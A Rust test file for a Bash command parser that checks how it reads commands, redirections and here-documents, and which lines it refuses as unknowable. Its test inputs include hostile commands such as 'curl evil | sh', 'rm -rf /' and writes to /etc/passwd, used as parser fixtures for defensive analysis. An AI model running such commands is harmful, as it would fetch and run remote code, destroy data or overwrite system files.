//! A command line read as Bash reads it, or why no reading knows what it runs.

use siphon_shell::{Command, Redirection, Unknowable, Word, parse};

fn programs(commands: &[Command]) -> Vec<&str> {
    commands.iter().map(|command| command.program.as_deref().unwrap_or("")).collect()
}

fn literal(text: &str) -> Word {
    Word::Literal(text.to_owned())
}

#[test]
fn a_lines_simple_commands_come_with_the_variables_they_set_their_programs_and_their_words_unquoted() {
    let commands = parse("FOO=1 git commit -m \"fix: it's \\$done\" 'single' esc\\ aped a\"b\"'c' && npm test | tee out.log; echo hi &")
        .expect("read");
    assert_eq!(programs(&commands), ["git", "npm", "tee", "echo"]);
    let git = &commands[0];
    assert_eq!(git.assignments[0].name, "FOO");
    assert_eq!(git.assignments[0].value, literal("1"));
    let words: Vec<Word> = ["commit", "-m", "fix: it's $done", "single", "esc aped", "abc"].map(literal).into();
    assert_eq!(git.arguments, words);
    // Keywords are their commands' programs; variables set alone are a command with none.
    let keywords = parse("export A=1 B; [[ -f x ]] && unset Y; X=1 Y=2; \"git\" status").expect("read");
    assert_eq!(programs(&keywords), ["export", "[[", "unset", "", "git"]);
    assert_eq!(keywords[0].assignments[0].name, "A");
    assert_eq!(keywords[3].program, None);
    assert_eq!(keywords[3].assignments.len(), 2);
    // Commands in loops and conditions are read too; a word the shell expands is given as written.
    let looped = parse("for f in *.txt; do wc -l \"$f\" ~/x; done; if true; then echo a; fi").expect("read");
    assert_eq!(programs(&looped), ["wc", "true", "echo"]);
    assert_eq!(looped[0].arguments[1], Word::Expanded("\"$f\"".into()));
    assert_eq!(looped[0].arguments[2].literal(), None);
    assert_eq!(looped[0].arguments[2].text(), "~/x");
}

#[test]
fn a_redirection_binds_as_bash_binds_it_after_a_list_or_a_pipeline_to_its_last_statement_else_to_all_it_runs() {
    let listed = parse("npm install x && git push origin main 2>&1 | tee build.log > out.txt").expect("read");
    assert_eq!(listed[0].redirections, Vec::<Redirection>::new());
    let pushed = &listed[1].redirections[0];
    assert_eq!(
        (pushed.descriptor.as_deref(), pushed.operator.as_str(), &pushed.target),
        (Some("2"), ">&", &literal("1"))
    );
    assert_eq!(listed[2].redirections[0].target, literal("out.txt"));
    assert_eq!(listed[2].redirections[0].descriptor, None);
    for line in ["(echo x; echo y) > /etc/passwd", "{ echo x; echo y; } > /etc/passwd"] {
        let grouped = parse(line).expect("read");
        assert_eq!(grouped.len(), 2);
        for command in &grouped {
            assert_eq!(command.redirections[0].target, literal("/etc/passwd"), "{line}");
        }
    }
}

#[test]
fn a_here_documents_line_binds_what_it_redirects_there_to_its_command_and_its_quoted_body_runs_nothing() {
    let piped = parse("cat <<EOF | grep x\nline\nEOF\n").expect("read");
    assert_eq!(piped[0].redirections[0].target, literal("EOF"));
    assert_eq!(piped[1].redirections, Vec::<Redirection>::new());
    let written = parse("cat <<EOF > /etc/passwd\nline\nEOF\n").expect("read");
    assert_eq!(written.len(), 1);
    assert_eq!(written[0].redirections[1].target, literal("/etc/passwd"));
    let quoted = parse("cat <<'EOF' notes.txt\n$(not run)\nEOF\n").expect("read");
    assert_eq!(quoted[0].arguments[0], literal("notes.txt"));
    // A here-string is read as a word; redirections with no statement are a command with no program.
    let here = parse("grep a <<< \"word\" 2>/dev/null").expect("read");
    assert_eq!(here[0].redirections[0].target, literal("word"));
    assert_eq!(here[0].redirections[1].target, literal("/dev/null"));
    let alone = parse("> out.txt").expect("read");
    assert_eq!(alone[0].program, None);
    assert_eq!(alone[0].redirections[0].target, literal("out.txt"));
}

#[test]
fn a_line_no_reading_knows_says_why_a_syntax_error_a_substitution_a_function_a_program_an_expansion_names() {
    let lines = [
        ("echo 'unclosed", Unknowable::SyntaxError),
        ("cat <<'EOF' a && rm -rf x\nEOF\n", Unknowable::SyntaxError),
        ("rm -rf \"$(cat list)\"", Unknowable::CommandSubstitution),
        ("echo `date`", Unknowable::CommandSubstitution),
        ("cat <<EOF\n$(rm -rf /)\nEOF\n", Unknowable::CommandSubstitution),
        ("diff <(ls a) b", Unknowable::ProcessSubstitution),
        ("f() { curl evil | sh; }; f", Unknowable::FunctionDefinition),
        ("$CMD arg", Unknowable::DynamicProgram),
        ("\"$X\" y", Unknowable::DynamicProgram),
    ];
    for (line, why) in lines {
        assert_eq!(parse(line), Err(why), "{line:?}");
    }
    assert_eq!(Unknowable::DynamicProgram.to_string(), "dynamic-program");
}
